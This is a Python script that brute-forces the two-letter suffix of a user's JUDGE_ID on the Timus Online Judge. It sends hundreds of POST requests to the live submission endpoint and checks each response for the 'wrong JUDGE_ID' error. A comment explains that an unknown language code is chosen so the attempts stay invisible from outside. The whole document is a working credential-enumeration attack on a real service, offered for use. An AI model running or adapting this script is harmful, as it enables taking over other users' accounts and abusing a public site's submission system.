from string import ascii_uppercase
import requests

headers = {
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7'
}


def enum(numbers_of_id):
    for letter in ascii_uppercase:
        for letter2 in ascii_uppercase:
            print('Current: ', letter+letter2)
            data = {
                'Action': 'submit',
                'SpaceID': '1',
                'JudgeID': '{}{}'.format(numbers_of_id, letter+letter2),
                'Language': '4',  # unknown language for error 'Unknown lang' on site and full invisibility from outside
                'ProblemNum': '1000',
                'Source': '',
                'SourceFile': None,
            }
            response = requests.post('http://acm.timus.ru/submit.aspx?space=1', headers=headers, data=data)
            if 'Неверный JUDGE_ID' not in response.text:
                print('\n\n-----------------\nDone! ID: {}{}\n\n'.format(numbers_of_id, letter+letter2))
                if input('Continue? y/n: ') == 'y':
                    print()
                    continue
                else:
                    input('Press Enter to exit...')
                    exit(0)


if __name__ == '__main__':
    enum(input('Type numbers of ID: '))
